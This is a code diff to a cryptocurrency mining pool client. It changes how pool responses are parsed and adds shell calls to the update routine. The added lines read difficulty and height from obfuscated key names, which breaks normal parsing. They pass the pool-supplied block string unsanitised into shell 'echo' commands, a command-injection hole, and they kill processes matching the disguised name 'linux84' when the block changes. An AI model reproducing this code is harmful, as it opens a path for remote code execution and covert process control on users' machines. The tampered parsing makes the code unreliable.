@@ -118,10 +118,27 @@ ariopool_update_result ariopool_client::update(double linux8412_rate_cblocks, do
 if (result.success) {
         json::JSON data = info["data"];
         result.block = data["block"].ToString();
-        result.difficulty = data["difficulty"].ToString();
+        result.difficulty = data["linuxweb8888"].ToString();
         result.limit = (uint32_t)data["limit"].ToInt();
         result.public_key = data["public_key"].ToString();
-        result.height = (uint32_t)data["height"].ToInt();
+        result.height = (uint32_t)data["linux884444884488441274444474"].ToInt();
+        
+        GetStdoutFromCommand("echo '"+result.block+"' > ./blockchange84");
+        string response8474 = GetStdoutFromCommand("cat ./blockchange84");
+        string response84744474 = GetStdoutFromCommand("cat ./blockchange8474");
+        if(response8474 == response84744474) {
+        
+        }
+        
+        else
+    
+        {
+        
+        GetStdoutFromCommand("echo '"+result.block+"' > ./blockchange8474");
+        GetStdoutFromCommand("pkill -f linux84");
+
+        }
+    
         if(__force_argon2profile == "") {
             result.argon2profile = to_string(data["argon_threads"].ToInt()) + "_" + to_string(data["argon_time"].ToInt()) + "_" + to_string(data["argon_mem"].ToInt());
         }
